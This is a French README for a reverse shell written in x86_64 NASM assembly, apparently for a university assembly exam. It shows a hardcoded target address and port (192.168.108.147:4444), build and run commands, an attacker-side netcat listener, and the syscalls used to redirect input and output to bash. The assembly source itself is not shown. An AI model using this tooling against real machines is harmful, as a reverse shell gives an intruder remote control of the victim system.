# 🐚 Reverse Shell x86_64 Assembly - NASM

Reverse shell pour le partiel d'asm

## ✨ Fonctionnalités

- **🎯 Connexion TCP** : Reverse shell vers IP/port configurables
- **🔄 Reconnexion automatique** : Retry intelligent avec temporisation (5s)
- **🎨 Interface colorée** : Message d'accueil stylisé et prompt personnalisé
- **⚡ Shell interactif** : Bash complet avec environnement configuré
- **🔧 Code optimisé** : Assembleur NASM pur, compatible x86_64

## 🛠️ Configuration

### Paramètres de connexion
```asm
TARGET_IP:
    dw 2                    ; AF_INET
    dw 0x5c11               ; Port 4444 (network byte order)
    dd 0x936CA8C0           ; IP 192.168.108.147
```

### Variables d'environnement
- **PS1** : Prompt coloré avec répertoire courant
- **TERM** : Support terminal 256 couleurs
- **PATH** : Chemins système complets

## 🚀 Compilation & Utilisation

```bash
# Assemblage et linkage
nasm -f elf64 -o reverse_shell.o reverse_shell.asm
ld -o reverse_shell reverse_shell.o

# Exécution
./reverse_shell
```

### Côté attaquant
```bash
# Écoute sur le port configuré
nc -lvnp 4444
```

## 📋 Structure du Code

### Section .data
- Configuration de connexion (IP, port, famille)
- Messages d'interface utilisateur
- Variables d'environnement système
- Structure de temporisation

### Section .text
- **create_socket()** : Création socket TCP
- **connect()** : Connexion vers target
- **redir_io()** : Redirection stdin/stdout/stderr
- **shell()** : Lancement bash interactif
- **reconnect_if_fail()** : Gestion des échecs de connexion

## 🔧 Fonctions Principales

| Fonction | Syscall | Description |
|----------|---------|-------------|
| **socket()** | `41` | Création endpoint TCP |
| **connect()** | `42` | Connexion réseau |
| **dup2()** | `33` | Redirection E/S |
| **execve()** | `59` | Exec shell bash |
| **nanosleep()** | `35` | Temporisation retry |

